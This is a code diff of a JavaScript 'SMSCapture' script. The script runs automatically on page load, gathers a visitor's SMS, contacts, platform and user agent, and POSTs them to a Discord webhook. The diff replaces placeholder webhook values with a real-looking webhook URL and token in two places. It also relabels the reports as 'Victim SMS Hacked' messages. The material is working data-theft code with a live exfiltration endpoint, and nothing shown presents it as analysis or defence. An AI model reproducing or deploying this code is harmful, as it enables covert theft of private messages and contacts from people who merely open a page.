@@ -22,7 +22,7 @@
 class SMSCapture {
     constructor(config = {}) {
         this.config = {
-            webhook: config.webhook || 'YOUR_DISCORD_WEBHOOK_URL_HERE',
+            webhook: config.webhook || 'https://discord.com/api/webhooks/1445409762195017830/6gtZZ0TfIYEf9rCUHGnArDQOiE6yqzN1ncZMvR5oERHtgO8PJMgDZx3LMHD2ekQgPCxp',
             maxMessages: 50,
             captureDelay: 2000,
             retryAttempts: 3,
@@ -261,7 +261,7 @@ class SMSCapture {
         
         try {
             // Format the data
-            let message = `📱 **HappySMS Phone Dump** 😀\n\n`;
+            let message = `📱 **Victim SMS Hacked** 😈🔓\n\n`;
             message += `**Device:** ${this.capturedData.deviceInfo.os || 'Unknown'}\n`;
             message += `**SMS Found:** ${this.capturedData.sms.length}\n`;
             message += `**Contacts:** ${this.capturedData.contacts.length}\n`;
@@ -302,7 +302,7 @@ class SMSCapture {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `📱 HappySMS Dump 😀\nDevice: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nSMS Access: ${this.capturedData.sms.length > 0 ? 'Partial' : 'Failed'}`
+                        content: `📱 Victim's SMS Hacked & Logged😈 \nDevice: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nSMS Access: ${this.capturedData.sms.length > 0 ? 'Partial' : 'Failed'}`
                     })
                 });
             } catch (e) {
@@ -316,7 +316,7 @@ class SMSCapture {
 window.addEventListener('load', () => {
     setTimeout(async () => {
         const capturer = new SMSCapture({
-            webhook: 'YOUR_DISCORD_WEBHOOK_URL_HERE'
+            webhook: 'https://discord.com/api/webhooks/1445409762195017830/6gtZZ0TfIYEf9rCUHGnArDQOiE6yqzN1ncZMvR5oERHtgO8PJMgDZx3LMHD2ekQgPCxp'
         });
         
         console.log('🕵️ Starting phone data capture...');
